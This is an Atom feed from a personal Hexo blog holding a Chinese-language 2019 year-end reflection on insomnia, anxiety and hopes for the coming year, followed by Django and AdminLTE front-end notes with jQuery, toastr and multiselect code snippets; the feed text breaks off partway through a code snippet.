<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Two_smi1e</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.twosmi1e.com/"/>
  <updated>2019-12-29T12:07:24.002Z</updated>
  <id>https://www.twosmi1e.com/</id>
  
  <author>
    <name>two_smi1e</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>总结2019</title>
    <link href="https://www.twosmi1e.com/2019/12/29/%E6%80%BB%E7%BB%932019/"/>
    <id>https://www.twosmi1e.com/2019/12/29/总结2019/</id>
    <published>2019-12-28T16:23:48.000Z</published>
    <updated>2019-12-29T12:07:24.002Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序-Preface"><a href="#0x00-序-Preface" class="headerlink" title="0x00 序 Preface"></a>0x00 序 <small>Preface</small></h2><blockquote><p><strong>年轻也曾对万物充满期待，眨眼间就落入了平庸之海。</strong></p></blockquote><h2 id="0x01-关于生活-Life"><a href="#0x01-关于生活-Life" class="headerlink" title="0x01 关于生活 Life"></a>0x01 关于生活 <small>Life</small></h2><p>这一年大概是有生以来最糟糕的一年了吧。<br>诶，好像我去年也是这么觉得的，日子一年比一年难了呢。</p><p>从今年年初就开始了不顺，本来拿到知道创宇offer，准备寒假去实习了，突然身体不舒服跑去医院，然后不得已放弃了实习，回家休息。原本以为回家还是能学习一下（21年的实践证明了这不可能），结果，废物了一个多月，回去几乎什么都没干。然后就是持续一年的颓废。</p><p>（开始翻空间微博回忆</p><p>2月底回到学校，把steam上买的高考恋爱一百天玩了两遍</p><p>3月份决定考研，然而因为自己的惯性和惰性，一直没有进入状态。然后一直都是什么也不想做又懊悔自己什么都没做，回忆自己之前不够努力，因为身体不好或者决定不对又错过很多东西，一边骂自己是个废物，一边又鼓励自己继续努力。<br>从年初去医院那次开始之后晚上就经常失眠，不敢睡觉，不知道是怕死还是怕什么，快要睡着时总会一下惊醒，感觉睡着了就会死，就醒不过来了一样。直到现在我对睡眠还有一种恐惧感，怕那种惊醒的感觉，那种濒临死亡的恐惧。这一年也跑医院跑了无数次了，抽过几次血测过几次心电图，心理评测疏导也做过，CT也打过，可是就是不知道什么原因。</p><p>一直到六月吧，都是一种很焦虑的状态，复习进度慢，效率低，晚上睡不好。看番倒是没落下，补完了小英雄，看完了NBA，追完了Carole&amp;Tuesday</p><blockquote><p>NOTE IN 2019/6/14<br>大概从今年年初开始吧，我就挣扎在深渊口前。</p><p>上学期努力了大半学期吧，得到了第一份实习，却因为身体原因错过。<br>然后便开始了放松放纵，一步一步走向深渊。</p><p>浑浑噩噩过了半年了。<br>我自负自卑，见识过很多优秀的人活的一如自己心中的模样，我觉得我可以但事实是我不配。<br>我害怕失败，因为已经有太多事没有做好了，努力也做不好。<br>我拖延懒散，可能不曾努力的失败更让我接受吧，“切，我还没努力呢”<br>我自暴自弃，都已经这样了，努力还有什么用呢，就这样当个废物混吃等死吧。</p><p>于是我什么事情都不想做，无论做什么都让我觉得烦躁，我也试着拯救自己，可是三分钟热情燃尽后，又是更深的堕落。</p><p>真糟糕啊，连我自己都讨厌我自己了。<br>我变成了我自己曾经最讨厌的模样，逃避着未来，逃避着现实。身体的虚弱和心理的自责时常折磨着我。</p><p>实力配不上野心大概是这世间最痛苦的事情之一吧。</p><p>年轻的勇士梦想着自己挥剑屠龙的样子，走进象牙塔拿起了剑，用力劈砍在木桩上，却只留下了几道浅浅的印子，而窗外已经有别的人取回了巨龙的头颅。他扔掉了剑蹲在角落，抱着头，所谓废物大概就是这样的吧。于是“勇士”还未曾走出象牙塔，就输给了自己。其实呢，废物也希望自己能够披荆斩棘，也曾在夜里偷偷练习，也曾许多次丢掉剑后又默默拾起，也曾因为取得进步而欢欣鼓舞。可是世界是残酷的，时间不断磨平他的棱角，抹去他的锐气，抹杀他的梦想。“就这样了吧”，他对自己说着，想着再也不碰那剑了。</p><p>也许他还会忍不住拿起那剑，像无数个热血故事那样，打篮球的樱木花道，持木剑的温华，还有屠龙的勇士，即使失败，也是拼光了一切再倒下。<br>也许他再也不会看那剑一眼，像无数个归于平凡的人，理想主义消散的丝毫不剩，得过且过着。</p><p>初二时的那个男孩，拿到了物理竞赛的省三等奖，领奖那天，他把奖状撕了，“这还远远不够呢，我要成为很厉害很厉害的人”<br>可是他后来也没有再在竞赛中获奖。<br>高一时的那个男孩，拿着奖学金进入高中，心里想着曾去过的绵高，“即使在一个普通高中，我也要考入一个很好很好的大学”<br>可是他后来不过进了一个普通一本。<br>大一时的那个男孩，高出录取线四十多分，“我不信命，即使在不喜欢的大学不喜欢的专业，我也想成为一个很厉害的人”<br>可是他后来还是这么差劲</p><p>有人对他说，“你已经很不错了”，但更多的人和事让他知道，“你还差的远呢”</p><p>最后勇士大抵还是打不过恶龙的</p><p>是早早丢掉武器，还是拼尽自己的一切？那个男孩会做出自己的选择吧。</p></blockquote><p>嗯 我试着拯救自己了<br>我试着拿起剑了，可是，有什么用呢<br>孤独的小怪兽，最终都会被正义的奥特曼杀死</p><p>我的失眠越来越严重，然后在暑假选择了回家。在家的确睡得很香，因为可以暂时逃避，可以不去想着以后怎么办要怎样去做。当然，在家也意味着，学习进度不会赶上了。于是回到学校后，我心态彻底崩了。</p><p>没有勇气报自己想报的学校，选择报了本校，然后出去找了实习，开始了工作。为什么？因为不甘读本校。讲好听一点，叫有傲气，实际上，眼高手低。</p><p>今年最成功的三件事，自卑，自闭，自暴自弃。</p><p>我太了解自己的懦弱了，太清楚自己的失败了。总是以为自己能够改变，却什么也改变不了。</p><p>刷六级，考教资，考公务员，考研，找实习······今年所该做的事也七七八八的做完了，放弃了一些，失败了一些，但还是把该走的路走完了，结果如何，以后怎样，就明年再说了。</p><p>2019，就这样吧。</p><h2 id="0x02-关于死亡-Death"><a href="#0x02-关于死亡-Death" class="headerlink" title="0x02 关于死亡 Death"></a>0x02 关于死亡 <small>Death</small></h2><p>失眠是很痛苦的。特别是明明很困，却不敢睡。</p><p>每个失眠的夜都难受的想死，却又十分怕死。对死亡的恐惧，大概是所有生物的本能吧，我也不例外。晚上睡不着时就会想，反正都会死的，那活着的意义是什么呢？是经历？这二十多年来，值得我在死前回忆的经历，屈指可数。是奉献？可我也没能力做重于泰山的人。</p><p>想了许久，活着的意义大概就是让自己更坦然的接收死亡吧。</p><p>朝闻道，夕死可矣。找到属于自己的道，不停歇的做自己喜欢的事，才能在死亡到来那一天，少一些遗憾吧。</p><p>希望自己不管因为生存，要做多少不得不做的事，都不要忘了去做真正想做的事——就是那种，想着自己快要死了，却十分后悔我当初没有什么什么呀。</p><p>每天干完工作，干一点自己想做的事，这才叫生活呀。</p><p>希望自己活得不要那么痛苦了，开心一点。</p><h2 id="0x03-关于未来-2020"><a href="#0x03-关于未来-2020" class="headerlink" title="0x03 关于未来 2020"></a>0x03 关于未来 <small>2020</small></h2><blockquote><p>在过去的一年里，你可能也曾不自知的陷入困境，抑或仍在自救与自毁的缝隙中求生，愿你有直面孤独的勇气，与志在必得的生机。</p></blockquote><p>讲道理年份只是人类对时间的人为划分，时间是连续的，并不会因为是新年而会有什么改变。</p><p>但还是会期待明年能好一点，立一些新年flag，定一些新年目标。</p><p>总之<br>无论是工作还是学习，希望自己能在努力一点，再坚持一下，不要再自暴自弃了。<br>希望自己的身体和心理都能健康，不要再失眠不要再焦虑，不要再跑去医院。<br>生活要开心一点，努力买一架电钢琴，不要放弃自己喜爱的东西。<br>多吃一点，自己一个人也要好好吃饭，好好照顾自己。<br>想学东西一定要去学，想看的电影一定要去看，想读的书一定要去读。<br>珍惜时光，珍惜生命，珍惜父母，珍惜身边人。</p><p>明年也许会好起来，也许会更难。</p><p>加油吧，如果少年拼尽全力也还是个废物，那等热血凉透的那一天，就好好做个混吃等死的废物吧，也挺不错的。</p><h2 id="0x04-关于爱情-Love"><a href="#0x04-关于爱情-Love" class="headerlink" title="0x04 关于爱情 Love"></a>0x04 关于爱情 <small>Love</small></h2><blockquote><p>人类的情爱总是让人失望，还好宇宙自有它的浪漫</p></blockquote><p>第三旋臂边缘<br>一颗蓝色行星<br>碳基生物正在庆祝<br>他们所在的行星<br>又在该恒星系里<br>完成了一次公转</p><p>他们也知道<br>整个太阳系<br>也是围绕着银河系公转<br>错过的位置<br>永远也不会再回来了</p><p>而银河系也在飞驰<br>甚至空间本身也在膨胀<br>他们走过的路<br>穷尽时光，无法回头</p><p>孤独才是永恒</p><h2 id="0x05-尾-Beginning"><a href="#0x05-尾-Beginning" class="headerlink" title="0x05 尾 Beginning"></a>0x05 尾 <small>Beginning</small></h2><blockquote><p>在心里倒数，然后伸出双手举过头顶，慢慢张开五指，给自己放个烟花，新年快乐！</p></blockquote><p><img src="/2019/12/29/总结2019/TIM图片20191228235738.jpg" alt="Alt text"><br>以往已不谏 来者可追否</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序-Preface&quot;&gt;&lt;a href=&quot;#0x00-序-Preface&quot; class=&quot;headerlink&quot; title=&quot;0x00 序 Preface&quot;&gt;&lt;/a&gt;0x00 序 &lt;small&gt;Preface&lt;/small&gt;&lt;/h2&gt;&lt;blockquot
      
    
    </summary>
    
    
      <category term="随笔" scheme="https://www.twosmi1e.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Django踩坑记录</title>
    <link href="https://www.twosmi1e.com/2019/12/25/Django%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.twosmi1e.com/2019/12/25/Django踩坑记录/</id>
    <published>2019-12-25T14:47:15.000Z</published>
    <updated>2019-12-28T16:25:42.639Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记几个坑和常用的代码段</p><h2 id="AdminLTE的侧边栏问题"><a href="#AdminLTE的侧边栏问题" class="headerlink" title="AdminLTE的侧边栏问题"></a>AdminLTE的侧边栏问题</h2><p>点击后侧边栏会自动收回，加入js代码使其在页面刷新后仍保持原有状态。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $(<span class="string">'.sidebar-menu li:not(.treeview) &gt; a'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $parent = $(<span class="keyword">this</span>).parent().addClass(<span class="string">'active'</span>);</span><br><span class="line">        $parent.siblings(<span class="string">'.treeview.active'</span>).find(<span class="string">'&gt; a'</span>).trigger(<span class="string">'click'</span>);</span><br><span class="line">        $parent.siblings().removeClass(<span class="string">'active'</span>).find(<span class="string">'li'</span>).removeClass(<span class="string">'active'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="built_in">window</span>).on(<span class="string">'load'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $(<span class="string">'.sidebar-menu a'</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">this</span>.href === <span class="built_in">window</span>.location.href)&#123;</span><br><span class="line">                $(<span class="keyword">this</span>).parent().addClass(<span class="string">'active'</span>)</span><br><span class="line">                    .closest(<span class="string">'.treeview-menu'</span>).addClass(<span class="string">'.menu-open'</span>)</span><br><span class="line">                    .closest(<span class="string">'.treeview'</span>).addClass(<span class="string">'active'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="通知问题"><a href="#通知问题" class="headerlink" title="通知问题"></a>通知问题</h2><p>使用toastr插件<br>初始化<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">toastr.options = &#123;</span><br><span class="line">  closeButton: <span class="literal">false</span>,</span><br><span class="line">  debug: <span class="literal">false</span>,</span><br><span class="line">  progressBar: <span class="literal">false</span>,</span><br><span class="line">  positionClass: <span class="string">"toast-top-right"</span>,</span><br><span class="line">  onclick: <span class="literal">null</span>,</span><br><span class="line">  showDuration: <span class="string">"300"</span>,</span><br><span class="line">  hideDuration: <span class="string">"1000"</span>,</span><br><span class="line">  timeOut: <span class="string">"5000"</span>,</span><br><span class="line">  extendedTimeOut: <span class="string">"1000"</span>,</span><br><span class="line">  showEasing: <span class="string">"swing"</span>,</span><br><span class="line">  hideEasing: <span class="string">"linear"</span>,</span><br><span class="line">  showMethod: <span class="string">"fadeIn"</span>,</span><br><span class="line">  hideMethod: <span class="string">"fadeOut"</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h2 id="ManyToManyField的添加问题"><a href="#ManyToManyField的添加问题" class="headerlink" title="ManyToManyField的添加问题"></a>ManyToManyField的添加问题</h2><p>前端使用multiselect插件<br><a href="https://crlcu.github.io/multiselect/" target="_blank" rel="external">https://crlcu.github.io/multiselect/</a></p><p>HTML:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade"</span> <span class="attr">id</span>=<span class="string">"AddGroupModal"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-header"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"modal-title"</span>&gt;</span>新分组<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">id</span>=<span class="string">"js_addGroupForm"</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-body"</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span> <span class="attr">id</span>=<span class="string">"modal.flashes"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"control-label"</span> <span class="attr">for</span>=<span class="string">"name"</span>&gt;</span>新分组:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"组名"</span> <span class="attr">id</span>=<span class="string">"name"</span> <span class="attr">autofocus</span> /&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"group_members"</span>&gt;</span>人员:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span> <span class="attr">style</span>=<span class="string">"width: 90%;height: 90%;"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-5"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"from[]"</span> <span class="attr">id</span>=<span class="string">"search"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">size</span>=<span class="string">"8"</span> <span class="attr">multiple</span>=<span class="string">"multiple"</span>&gt;</span></span><br><span class="line">                                        &#123;% for linkman in linkmen %&#125;</span><br><span class="line">                                        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"&#123;&#123; linkman.id &#125;&#125;"</span>&gt;</span>&#123;&#123; linkman.name &#125;&#125;<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                                        &#123;% endfor %&#125;</span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-2"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"search_rightAll"</span> <span class="attr">class</span>=<span class="string">"btn btn-block"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-forward"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"search_rightSelected"</span> <span class="attr">class</span>=<span class="string">"btn btn-block"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-chevron-right"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"search_leftSelected"</span> <span class="attr">class</span>=<span class="string">"btn btn-block"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-chevron-left"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"search_leftAll"</span> <span class="attr">class</span>=<span class="string">"btn btn-block"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-backward"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-5"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"to[]"</span> <span class="attr">id</span>=<span class="string">"search_to"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">size</span>=<span class="string">"8"</span> <span class="attr">multiple</span>=<span class="string">"multiple"</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-footer"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default pull-left"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span>&gt;</span>关闭<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"js_addGroup"</span>&gt;</span>保存<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- /.modal-content --&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!-- /.modal-dialog --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- /.modal --&gt;</span></span><br></pre></td></tr></table></figure></p><p>js：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">jQuery(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params">$</span>) </span>&#123;</span><br><span class="line">    $(<span class="string">'#search'</span>).multiselect(&#123;</span><br><span class="line">        search: &#123;</span><br><span class="line">            left: <span class="string">'&lt;input type="text" name="q" class="form-control" placeholder="Search..." /&gt;'</span>,</span><br><span class="line">            right: <span class="string">'&lt;input type="text" name="q" class="form-control" placeholder="Search..." /&gt;'</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        fireSearch: <span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> value.length &gt; <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="comment">// 提交表单</span></span><br><span class="line">          $(<span class="string">'#js_addGroup'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">              <span class="keyword">var</span> name = $(<span class="string">'#name'</span>).val();</span><br><span class="line">              <span class="keyword">var</span> options = $(<span class="string">'#search_to option'</span>);</span><br><span class="line">              <span class="keyword">var</span> members = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">              <span class="keyword">var</span> i;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;options.length;i++)&#123;</span><br><span class="line">                  members.push(options[i].value);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">//console.log(members);</span></span><br><span class="line"></span><br><span class="line">              toastr.options = &#123;</span><br><span class="line">                closeButton: <span class="literal">false</span>,</span><br><span class="line">                debug: <span class="literal">false</span>,</span><br><span class="line">                progressBar: <span class="literal">false</span>,</span><br><span class="line">                positionClass: <span class="string">"toast-top-right"</span>,</span><br><span class="line">                onclick: <span class="literal">null</span>,</span><br><span class="line">                showDuration: <span class="string">"300"</span>,</span><br><span class="line">                hideDuration: <span class="string">"1000"</span>,</span><br><span class="line">                timeOut: <span class="string">"5000"</span>,</span><br><span class="line">                extendedTimeOut: <span class="string">"1000"</span>,</span><br><span class="line">                showEasing: <span class="string">"swing"</span>,</span><br><span class="line">                hideEasing: <span class="string">"linear"</span>,</span><br><span class="line">                showMethod: <span class="string">"fadeIn"</span>,</span><br><span class="line">                hideMethod: <span class="string">"fadeOut"</span></span><br><span class="line">              &#125;;</span><br><span class="line">              $.ajax(&#123;</span><br><span class="line">                  cache: <span class="literal">false</span>,</span><br><span class="line">                  type: <span class="string">"POST"</span>,</span><br><span class="line">                  url: <span class="string">"&#123;% url 'contacts:add_group' %&#125;"</span>,</span><br><span class="line">                  dataType: <span class="string">'json'</span>,</span><br><span class="line">                  <span class="comment">//data: $('#js_addGroupForm').serialize(),</span></span><br><span class="line">                  data: &#123;</span><br><span class="line">                    <span class="string">'name'</span>: name,</span><br><span class="line">                    <span class="string">'members'</span>: members,</span><br><span class="line">                  &#125;,</span><br><span class="line">                  <span class="keyword">async</span>: <span class="literal">true</span>,</span><br><span class="line">                  beforeSend: <span class="function"><span class="keyword">function</span> (<span class="params">xhr, settings</span>) </span>&#123;</span><br><span class="line">                      <span class="comment">// 这里需要csrf_token的值，而不是代码</span></span><br><span class="line">                      xhr.setRequestHeader(<span class="string">"X-CSRFToken"</span>, <span class="string">"&#123;&#123; csrf_token &#125;&#125;"</span>);</span><br><span class="line">                  &#125;,</span><br><span class="line">                  success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">                      <span class="keyword">if</span> (data.status == <span class="string">'success'</span>) &#123;</span><br><span class="line">                          toastr.options.timeOut = <span class="number">1000</span>;</span><br><span class="line">                          toastr.options.onHidden = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="built_in">window</span>.location.href = <span class="string">"&#123;% url 'contacts:group_list' 